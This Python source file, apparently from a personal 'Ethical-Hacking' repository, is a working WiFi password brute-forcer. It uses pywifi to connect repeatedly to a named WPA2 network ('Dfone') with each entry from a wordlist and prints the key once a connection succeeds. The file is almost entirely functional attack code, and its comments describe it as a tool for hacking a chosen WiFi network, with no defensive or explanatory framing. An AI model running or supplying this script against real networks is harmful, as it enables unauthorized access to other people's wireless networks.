###############################################################################################################

# Github Repo For Hacking Stuff --> https://github.com/r-sajal/Ethical-Hacking/

###############################################################################################################
# Importing General Libraries
import argparse
import sys , os , os.path , platform
import re
import time

# Importing pywifi library
import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile



# Change According to needs -->
# cient_ssid == name of the wifi which you want to hack
# path to already created brute force password file

client_ssid = "Dfone"
path_to_file = r"C:\Users\Sajal\Desktop\password.txt"

####### 



# Setting the color combinations
RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"


try:
    # Interface information 
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]  # for wifi we use index - 0

    ifaces.scan() #check the card
    results = ifaces.scan_results() #Obtain the results of the previous triggerred scan. A Profile list will be returned.


    wifi = pywifi.PyWiFi() # A Profile is the settings of the AP we want to connect to
    iface = wifi.interfaces()[0]

except:
    print("[-] Error system")

type = False

def main(ssid, password, number):

    profile = Profile()  # create profile instance
    profile.ssid = ssid  #name of client
    profile.auth = const.AUTH_ALG_OPEN # auth algo
    profile.akm.append(const.AKM_TYPE_WPA2PSK) # key management
    profile.cipher = const.CIPHER_TYPE_CCMP #type of cipher


    profile.key = password # use generated password
    iface.remove_all_network_profiles() # remove all the profiles which are previously connected to device
    tmp_profile = iface.add_network_profile(profile) # add new profile 
    time.sleep(0.1) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) # 1s

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, GREEN,'[*] Crack success!',RESET)
        print(BOLD, GREEN,'[*] password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Crack Failed using {}'.format(number, password))

# opening and reading the file
def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)
                    


def menu(client_ssid,path_to_file):

    # Argument Parser for making cmd interative
    parser = argparse.ArgumentParser(description='argparse Example')

    # adding arguments
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    print()

    args = parser.parse_args()

    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(1.5)

    # taking wordlist and ssid if given else take default
    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = client_ssid
        filee = path_to_file 


    # breaking 
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE,"[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)



# Main function call
menu(client_ssid , path_to_file)


###########################################################################################################################################################
# END OF FILE 

# Code by Sajal Rastogi

###########################################################################################################################################################